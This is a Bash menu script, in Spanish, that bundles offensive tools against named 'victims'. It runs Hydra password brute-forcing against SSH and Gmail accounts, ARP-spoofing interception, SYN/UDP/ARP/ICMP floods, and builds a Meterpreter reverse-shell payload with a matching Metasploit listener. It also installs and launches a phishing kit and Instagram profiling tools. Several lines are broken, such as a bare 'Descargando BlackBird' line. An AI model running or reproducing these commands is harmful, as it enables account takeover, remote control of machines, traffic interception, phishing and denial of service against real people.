#!/bin/bash

clear;


#opcion=0



while [ opcion!=0 ]

do

      clear;

      echo " ";
      echo " ----------------------------------------------------------";
      echo "|                  (っ◔◡◔)っ  Menu                         |";
      echo "|----------------------------------------------------------|";
      echo "|                         OPCIONES                         |";
      echo "|----------------------------------------------------------|";
      echo "| 30 - Salir                                               |";    
      echo "|----------------------------------------------------------|";
      echo "| 25 - ??                                                  |";
      echo "| 24 - Phishing                                            |"; 
      echo "|----------------------------------------------------------|";
      echo "| 23 - OSINT Instagram                                     |";
      echo "| 22 - OSINT Install                                       |";
      echo "|----------------------------------------------------------|";
      echo "| 21 - TCP Attack                                          |";
      echo "| 20 - UDP Attack                                          |";
      echo "| 19 - ICMP Attack                                         |";
      echo "| 18 - ARP Attack                                          |";
      echo "|----------------------------------------------------------|";
      echo "| 17 - Hydra GMAIL                                         |";
      echo "| 16 - Borrar metadatos (no borra todos)                   |";
      echo "| 15 - Cambiar metadato de archivo                         |";
      echo "| 14 - Ver metadatos de un archivo                         |";
      echo "| 13 - Extraer texto de imagen                             |";
      echo "| 12 - Fusionar texto a imagen                             |";
      echo "| 11 - Mostrar contenido oculto de una imagen              |";
      echo "| 10 - Añadir contenido a una imagen                       |";
      echo "|  9 - Ejecutar Exploit                                    |";
      echo "|  8 - Crear Exploit                                       |";
      echo "|  7 - Sherlock                                            |";
      echo "|  6 - Restablecer red                                     |";
      echo "|  5 - Dejar sin red                                       |";
      echo "|  4 - Ver S.O de un equipo                                |";
      echo "|  3 - Nmap toda la red                                    |";
      echo "|  2 - SSH DirectAT                                        |";
      echo "|  1 - Hydra SSH                                           |";
      echo "|  0 - Instalar dependencias                               |";
      echo " ----------------------------------------------------------";



      read -p "Escoge opcion: " opcion;

      case $opcion in

        0)

        echo "actualizando librerias"

        sleep 2

        sudo apt update

        echo "instalando metasploit"

	sleep 2

	echo "descagando diccionario"

	wget https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt

 	mv 10-million-password-list-top-1000000.txt diccionario.txt

        sleep 2

        chmod +x msfinstall && sudo ./msfinstall
	sudo snap install metasploit-framework

        echo "instalando Hydra"

        sleep 2

        sudo apt install --yes hydra

        echo "instalando NMAP"

        sleep 2

        sudo apt install --yes nmap

        echo "instalando DSNIFF"

        sleep 2

        sudo apt install --yes dsniff

        echo "instalando SSH"

        sleep 2

        sudo apt install --yes ssh

        echo "instalando NFTABLES"

        sleep 2

        sudo apt install --yes nftables 

        echo "instalando EXIFTOOL"

        sleep 2

        sudo apt install --yes libimage-exiftool-perl

        echo "Instalando HPING3"

        sleep 2

        sudo apt install --yes hping3

        echo "instalando Sherlock"

        sleep 2

 	sudo apt install python3-pip
        sudo apt install python3-pandas
	sudo apt install python3-requests-futures
	sudo apt install python3-torrequest

	git clone https://github.com/sherlock-project/sherlock.git

        python3 -m pip install -r sherlock/requirements.txt

        wget https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt

        mv 10-million-password-list-top-1000000.txt diccionario.txt

	sleep 2
	
	sudo apt install curl
	
	sudo apt install git python3 php openssh-client -y
	
	git clone https://github.com/KasRoudra/PyPhisher

	cd PyPhisher
	
	pip3 install -r files/requirements.txt
	
	cd ..
	
	git clone https://github.com/cisagov/decider.git
	sudo pip3 install -r decider/requirements.txt

 	Descargando BlackBird
  	sleep 3
   	git clone https://github.com/p1ngul1n0/blackbird.git
    	cd blackbird
     	pip3 install -r requirements.txt
        cd ..
        ;;

        1)

        clear

        read -p "Usuario: " usuario

        read -p "IP: " ip

        hydra -V -f -l $usuario -P diccionario.txt -o results.txt $ip ssh

        ;;


        2)

        clear

        read -p "Dime la contraseña: " contra

        read -p "Dime el usuario: " usu

        read -p "Dime la IP: " ip

        read -p "Que comando quieres usar: " comand

        watch -n 0.1 sshpass -p $contra ssh -t $usu@$ip " $comand "

        ;;


        3)

        clear

        read -p "Dime el nombre de la Red: " red

        read -p "Parametros? (T4,sP): " parametro

	      nmap -$parametro $red/24

        sleep 60

        ;;

        4)


       clear

        read -p "Dime el equipo que quieres comprobar: " eq

        nmap -T4 -O $eq

        ;;

        5)

        #read -p "Dime la ip del gateway: " gateway

        read -p "Dime la ip de la victima: " victima

        arpspoof -t $victima 192.168.12.10 2> /dev/null &

        arpspoof -t 192.168.12.10 $victima 2> /dev/null &

        sysctl net.ipv4.ip_forward=1

        nft -f redir80443.txt

        ;;

        6)

        killall arpspoof

       ;;

        7)

        read -p "Dime el usuario que quieres investigar: " usr

        cd sherlock

        python3 sherlock $usr

        sleep 60

        cd ..

        ;;

        8)


        read -p "Dime como quieres que se llame el exploit: " exp

        read -p "Dime tu IP: " ip

        msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=$ip -f elf -o ~/$exp

        ;;


        9)

        read -p "Dime tu dirección IP: " ip

        echo "use exploit/multi/handler" > exploit.rc

        echo "set PAYLOAD linux/x64/meterpreter/reverse_tcp" >> exploit.rc

        echo "set LHOST $ip" >> exploit.rc

        echo "run" >> exploit.rc

        msfconsole -q -r exploit.rc

        ;;

        10)

        read -p "Dime el texto que quieres meter en una imagen: " texto

        read -p "Dime el nombre de la imagen: " nimagen

        read -p "Dime el nombre de la imagen Final: " fimagen

        echo "$texto" > .topsecret.txt && cat $nimagen .topsecret.txt > $fimagen

        ;;

        11)

        read -p "Dime nombre de la imagen: " img

        strings $img    

        sleep 10

        ;;

        12)

        read -p "Dime el texto que quieres meter en una imagen: " texto

        read -p "Dime el nombre de la imagen: " nimagen

        read -p "Dime el nombre del archivo oculto O si el nombre de uno que quieras utilizar: " arch

        echo $texto > $arch 

        steghide embed -ef $arch -cf $nimagen

        ;;

        13)

        read -p "Dime nombre del archivo: " img

	      steghide extract -sf $img       

        sleep 5

        ;;

        14)

        read -p "Dime nombre del archivo: " img

        exiftool -s $img

        sleep 10

        ;;

        15)

        read -p "Dime nombre del archivo: " arch

        read -p "Dime el nombre del metadato que quieres modificar: " meta

        read -p "Dime el nuevo valor que quieres añadirle: " valor

        exiftool -$meta=$valor $arch

        ;;

        16)

        read -p "Dime el del archivo: " arch

        exiftool -all= $arch

        ;;

	17)

      	read -p "Dime el correo electronico de la victima: " visti

        hydra -s 465 -S -v -V -l $visti -P diccionario.txt -e s -f -t 16 smtp.gmail.com smtp

        sleep 20

        ;;

        18)

        read -p "Dime la ip de la Víctima: " ip

        nping --arp --rate 3000 -c 100000 $ip

       	;;

        19)

        read -p "Dime la ip de la Víctima: " ip

        sudo ping -f $ip

        ;;

        20)

        read -p "Dime la ip de la Víctima: " ip

        nping --udp --flags syn --rate 3000 -c 100000 $ip

      	;;

        21)

        read -p "Dime la ip de la Víctima: "  ip

        nping --tcp --flags syn --rate 3000 -c 100000 $ip

      	;;

      	22)
      
      	git clone https://github.com/Datalux/Osintgram.git

  	cd Osintgram

      	sudo pip3 install -r requirements.txt

      	sleep 5

	      clear

	      echo "Acuerdate de ir al directorio Osintgram y ejecutar el cómando make setup con la cuenta del bot de instagram"

	      sleep 20

	      cd ..

       	;;

      	23)

      	read -p "Dime el usuario de la victima: " urs

      	cd Osintgram/

      	python3 main.py $urs

	    	sleep 10

      	cd ..

	      ;;
	24)
	
	python3 PyPhisher/pyphisher.py
	
	;;
	
	25)
	
	;;
        
	30)
        
        exit

        ;;
        esac

        done"
